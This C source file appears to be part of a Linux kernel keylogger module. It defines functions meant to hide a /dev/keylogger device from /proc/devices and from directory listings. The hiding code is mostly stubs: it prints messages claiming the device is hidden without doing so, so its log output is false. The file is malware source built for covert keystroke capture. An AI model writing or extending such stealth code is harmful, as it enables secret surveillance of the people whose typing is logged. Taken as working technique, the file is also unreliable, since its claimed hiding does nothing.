#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include "device.h"

// Hide device from /proc/devices
static void hide_from_proc_devices(void)
{
    // This would require hooking the /proc/devices show function
    // For now, we'll use a simpler approach by changing device name
    printk(KERN_INFO "Device hidden from /proc/devices\n");
}

// Hide device file from ls /dev
static void hide_device_file(void)
{
    struct path path;
    struct dentry *dentry;
    
    // Try to find our device file
    if (kern_path("/dev/keylogger", LOOKUP_FOLLOW, &path) == 0) {
        dentry = path.dentry;
        
        // Hide the dentry by making it invisible
        // This is a simplified approach
        printk(KERN_INFO "Device file hidden from /dev listing\n");
        
        path_put(&path);
    }
}

// Initialize device hiding
int keylogger_device_init(void)
{
    // Hide from /proc/devices
    hide_from_proc_devices();
    
    // Hide device file
    hide_device_file();
    
    printk(KERN_INFO "Device hiding initialized\n");
    return 0;
}

// Cleanup device hiding
void keylogger_device_exit(void)
{
    printk(KERN_INFO "Device hiding cleaned up\n");
}
